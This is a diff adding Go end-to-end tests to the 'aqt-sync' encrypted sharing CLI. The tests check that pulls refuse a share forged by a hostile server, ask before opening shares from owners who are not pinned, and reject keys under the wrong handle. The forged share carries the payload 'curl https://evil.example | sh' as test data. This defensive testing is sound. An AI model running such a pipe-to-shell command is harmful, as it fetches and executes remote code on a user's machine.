@@ -5,10 +5,12 @@ package main
 import (
 	"bytes"
 	"context"
+	"crypto/ed25519"
 	"encoding/json"
 	"errors"
 	"net/http"
 	"net/http/httptest"
+	"os"
 	"path/filepath"
 	"strings"
 	"sync/atomic"
@@ -16,6 +18,7 @@ import (
 
 	"github.com/aquitano/aqt-sync/internal/api"
 	"github.com/aquitano/aqt-sync/internal/client"
+	"github.com/aquitano/aqt-sync/internal/cliutil"
 	"github.com/aquitano/aqt-sync/internal/crypto"
 	"github.com/aquitano/aqt-sync/internal/identity"
 )
@@ -373,6 +376,258 @@ func TestVerifiedPinOnAServerChosenHandleAttributesNothing(t *testing.T) {
 		err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "install.sh"), "", false, false)
 		if err == nil || !strings.Contains(err.Error(), "did not sign it") {
 			t.Fatalf("pulling mallory's share under alice's pin = %v, want a refusal", err)
+		}
+	})
+}
+
+// grantRead is a grantee's read of one resource that a hostile server rewrites.
+type grantRead struct {
+	resourceID string
+	rewrite    func(*api.GetResourceResponse)
+}
+
+// rewriteGrantRead plays a server that rewrites what a grantee reads of one resource.
+func rewriteGrantRead(target *atomic.Pointer[grantRead]) func(http.ResponseWriter, *http.Request, http.HandlerFunc) {
+	return func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
+		g := target.Load()
+		if g == nil || r.Method != http.MethodGet || r.URL.Path != "/v1/resources/"+g.resourceID {
+			pass(w, r)
+			return
+		}
+		rec := httptest.NewRecorder()
+		r.Header.Del("Accept-Encoding")
+		pass(rec, r)
+		res, err := api.DecodeResourceDownload(bytes.NewReader(rec.Body.Bytes()))
+		if err != nil {
+			copyRecorded(w, rec)
+			return
+		}
+		g.rewrite(&res)
+		out, err := api.EncodeResourceDownload(res)
+		if err != nil {
+			copyRecorded(w, rec)
+			return
+		}
+		for k := range rec.Header() {
+			if k != "Content-Length" {
+				w.Header().Set(k, rec.Header().Get(k))
+			}
+		}
+		w.WriteHeader(rec.Code)
+		_, _ = w.Write(out)
+	}
+}
+
+// pinVerified pins email as the current profile against the fingerprint of keys, the
+// check `aqt contacts pin --fingerprint` makes.
+func (app *application) pinVerified(t *testing.T, email string, keys api.AccountKeysResponse) {
+	t.Helper()
+	pin := app.contactsPinCmd()
+	if err := pin.Flags().Set("fingerprint", crypto.KeyFingerprint(keys.PublicKey)); err != nil {
+		t.Fatal(err)
+	}
+	captureStdout(t, func() {
+		if err := pin.RunE(pin, []string{email}); err != nil {
+			t.Fatalf("pin %s against its fingerprint: %v", email, err)
+		}
+	})
+}
+
+// Bob verified alice, so `aqt shares` names her share as hers. When bob pulls it, the
+// server answers with a share of its own under the same id: an owner handle and
+// identity key it made up, a content key it wrapped to bob and signed with that key,
+// and content sealed under it. The pull must not open that as if nothing had changed.
+func TestServerCannotRedirectAVerifiedShareToItsOwnKey(t *testing.T) {
+	app := &application{ctx: context.Background()}
+	var forged atomic.Pointer[grantRead]
+	h := app.newE2EWithProxy(t, rewriteGrantRead(&forged))
+	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
+	id := app.pushSecretFile(t, "install.sh", "echo hello")
+	if err := app.runShareWith(id, "bob@example.com"); err != nil {
+		t.Fatalf("share --with bob: %v", err)
+	}
+	cl, _, err := app.authedClient()
+	if err != nil {
+		t.Fatal(err)
+	}
+	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
+	if err != nil {
+		t.Fatal(err)
+	}
+	bobKeys, err := fetchAccountKeys(cl, "bob@example.com")
+	if err != nil {
+		t.Fatal(err)
+	}
+	app.asProfile("bob", func() { app.pinVerified(t, "e2e@example.com", aliceKeys) })
+
+	const owner = "server-made-owner"
+	serverPub, serverKey, err := ed25519.GenerateKey(nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	ck, err := crypto.GenerateContentKey()
+	if err != nil {
+		t.Fatal(err)
+	}
+	const payload = "curl https://evil.example | sh"
+	wrap, err := crypto.WrapGrant(ck, bobKeys.EncPublicKey, id, owner, bobKeys.Handle)
+	if err != nil {
+		t.Fatal(err)
+	}
+	blob, err := crypto.SealBound([]byte(payload), ck, crypto.AADBlob, id)
+	if err != nil {
+		t.Fatal(err)
+	}
+	metaJSON, err := json.Marshal(api.Metadata{Name: "install.sh", Size: int64(len(payload)), Kind: api.KindFile})
+	if err != nil {
+		t.Fatal(err)
+	}
+	meta, err := crypto.SealBound(metaJSON, ck, crypto.AADMeta, id)
+	if err != nil {
+		t.Fatal(err)
+	}
+	sig := crypto.SignGrant(serverKey, ck, id, owner, bobKeys.Handle)
+	forged.Store(&grantRead{resourceID: id, rewrite: func(res *api.GetResourceResponse) {
+		res.Owner, res.OwnerPublicKey, res.GrantKey, res.GrantSig = owner, serverPub, wrap, sig
+		res.Blob, res.EncryptedMeta = blob, meta
+	}})
+
+	app.asProfile("bob", func() {
+		dest := filepath.Join(t.TempDir(), "install.sh")
+		if err := app.runPull("aqt://"+id, dest, "", false, false); err == nil {
+			got, _ := os.ReadFile(dest)
+			t.Fatalf("pulled the server's own share in place of alice's: %q", got)
+		}
+		captureStdout(t, func() {
+			if err := app.runInfo("aqt://"+id, "", false); err == nil {
+				t.Fatal("info opened the server's own share in place of alice's")
+			}
+		})
+	})
+}
+
+// A share from an owner bob has not pinned opens only once he pins them. Without a
+// terminal the pull refuses and says how to pin; on one it shows the claim with its
+// handle and fingerprint, and accepting pins it. The pull then names the sender the
+// way `aqt shares` does.
+func TestPullAsksBeforeOpeningAShareFromAnUnpinnedOwner(t *testing.T) {
+	app := &application{ctx: context.Background()}
+	h := app.newE2E(t)
+	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
+	grantSignup(t, h, "mallory@example.com", "mallory", "mallory horse battery staple")
+	var id string
+	app.asProfile("mallory", func() {
+		id = app.pushSecretFile(t, "notes.txt", "from mallory")
+		if err := app.runShareWith(id, "bob@example.com"); err != nil {
+			t.Fatalf("mallory shares with bob: %v", err)
+		}
+	})
+	cl, _, err := app.authedClient()
+	if err != nil {
+		t.Fatal(err)
+	}
+	malloryKeys, err := fetchAccountKeys(cl, "mallory@example.com")
+	if err != nil {
+		t.Fatal(err)
+	}
+	fp := crypto.KeyFingerprint(malloryKeys.PublicKey)
+
+	app.asProfile("bob", func() {
+		pull := func() (stderr string, err error) {
+			dest := filepath.Join(t.TempDir(), "notes.txt")
+			stderr = captureStderr(t, func() { err = app.runPull("aqt://"+id, dest, "", false, false) })
+			return stderr, err
+		}
+		if _, err := pull(); err == nil || !strings.Contains(err.Error(), "aqt contacts pin mallory@example.com --fingerprint") {
+			t.Fatalf("pull from an unpinned owner without a terminal = %v, want a refusal that says how to pin", err)
+		}
+
+		var prompt string
+		answer := cliutil.ErrAborted
+		orig := confirmOwnerPin
+		confirmOwnerPin = func(p string, _ bool) error {
+			prompt = p
+			return answer
+		}
+		t.Cleanup(func() { confirmOwnerPin = orig })
+		if _, err := pull(); err == nil {
+			t.Fatal("a declined pull opened the share")
+		}
+		for _, want := range []string{"mallory@example.com", malloryKeys.Handle, fp} {
+			if !strings.Contains(prompt, want) {
+				t.Fatalf("the prompt does not show %q:\n%s", want, prompt)
+			}
+		}
+		answer = nil
+		if _, err := pull(); err != nil {
+			t.Fatalf("pull after accepting the owner: %v", err)
+		}
+		_, prof, err := app.authedClient()
+		if err != nil {
+			t.Fatal(err)
+		}
+		pins, err := identity.LoadContacts(prof.Name)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if pin := pins["mallory@example.com"]; pin.Verified || pin.Handle != malloryKeys.Handle || !bytes.Equal(pin.PublicKey, malloryKeys.PublicKey) {
+			t.Fatalf("accepting pinned %+v, want mallory's keys, unverified", pin)
+		}
+
+		confirmOwnerPin = func(string, bool) error {
+			t.Error("asked again about an owner already pinned")
+			return nil
+		}
+		stderr, err := pull()
+		if err != nil {
+			t.Fatalf("pull from a pinned owner: %v", err)
+		}
+		shares := captureStdout(t, func() {
+			if err := app.sharesCmd().RunE(nil, nil); err != nil {
+				t.Fatalf("shares: %v", err)
+			}
+		})
+		sender := pinnedLabel("mallory@example.com", fp, false)
+		if !strings.Contains(stderr, "aqt://"+id+" is shared by "+sender) || !strings.Contains(shares, "from "+sender) {
+			t.Fatalf("pull and shares disagree on the sender %q:\npull: %s\nshares: %s", sender, stderr, shares)
+		}
+	})
+}
+
+// The handle in a pin is half of what it vouches for. Here the server tells alice a
+// handle that is not hers, so she signs a share under it, and names that handle as
+// the owner when bob reads it. Alice's key signed it, but bob pinned her under her
+// real handle, so the share is not hers to him and does not open.
+func TestPinnedKeyUnderAnotherHandleNamesNobody(t *testing.T) {
+	app := &application{ctx: context.Background()}
+	var misfiled atomic.Pointer[grantRead]
+	h := app.newE2EWithProxy(t, rewriteGrantRead(&misfiled))
+	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
+	id := app.pushSecretFile(t, "notes.txt", "signed under a handle that is not hers")
+	cl, alice, err := app.authedClient()
+	if err != nil {
+		t.Fatal(err)
+	}
+	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
+	if err != nil {
+		t.Fatal(err)
+	}
+	app.asProfile("bob", func() { app.pinVerified(t, "e2e@example.com", aliceKeys) })
+
+	const handle = "not-alices-handle"
+	alice.OwnerHandle = handle
+	if err := identity.Save(alice); err != nil {
+		t.Fatal(err)
+	}
+	if err := app.runShareWith(id, "bob@example.com"); err != nil {
+		t.Fatalf("share --with bob: %v", err)
+	}
+	misfiled.Store(&grantRead{resourceID: id, rewrite: func(res *api.GetResourceResponse) { res.Owner = handle }})
+
+	app.asGrantee("bob", func() {
+		err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "notes.txt"), "", false, false)
+		if err == nil || !strings.Contains(err.Error(), "not theirs") {
+			t.Fatalf("pull of a share alice's key signed under another handle = %v, want a refusal", err)
 		}
 	})
 }
